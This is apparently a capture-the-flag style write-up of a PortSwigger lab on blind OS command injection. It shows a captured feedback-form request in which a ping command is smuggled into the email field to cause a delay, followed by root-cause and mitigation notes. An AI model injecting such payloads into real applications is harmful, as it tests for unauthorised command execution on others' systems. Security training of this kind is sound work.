💻 Blind OS Command Injection – With Time Delays
🧠 Difficulty: Apprentice
📚 Platform: PortSwigger Web Security Academy
👩‍💻 Author: Kaouthar Belkebir

📌 Lab Description
This lab is vulnerable to blind OS command injection via the feedback form.

The application executes a shell command based on submitted data but doesn't return the output.

✅ Goal: Exploit the injection to perform a time delay using ping, confirming code execution.

🧪 Exploitation Strategy
🧩 The Trick:
Because it's blind, we can't see the output.
So we use a time delay (e.g., ping) to observe if the system waits, which confirms execution.

📥 Intercepted Request (Burp Suite)
http
Copy
Edit
POST /feedback/submit HTTP/2
Host: [LAB_DOMAIN]
Cookie: session=pKZ4noaM5dQpCAdmpBSs1eCJKla9waju
Content-Type: application/x-www-form-urlencoded

csrf=...&
name=helio&
email=ha||ping+-c+10+127.0.0.1||cer@gmail.com&
subject=hello&
message=hakennhu
⏱️ The server responds after ~10 seconds — proof of command injection.

🧠 Why This Works
bash
Copy
Edit
ha||ping -c 10 127.0.0.1||cer@gmail.com
The injected ping command causes a deliberate delay.

The shell executes the payload because the input is unsanitized.

🔬 Root Cause
The app concatenates unvalidated user input into a shell command.

Lack of sanitization makes command injection trivial.

✅ Confirmation & Solution
The delayed response confirms the command executed.

This completes and solves the lab ✔️

🛡️ Mitigation Strategies
Avoid shell command concatenation with user input.

Use safe system APIs (e.g., execFile instead of exec in Node.js).

Apply input validation (whitelisting, escaping).

🖼️ Screenshot
![Blind OS Command Injection – Time Delay](https://github.com/Kabilala/OS-command-injection/blob/main/lab2.png?raw=true)
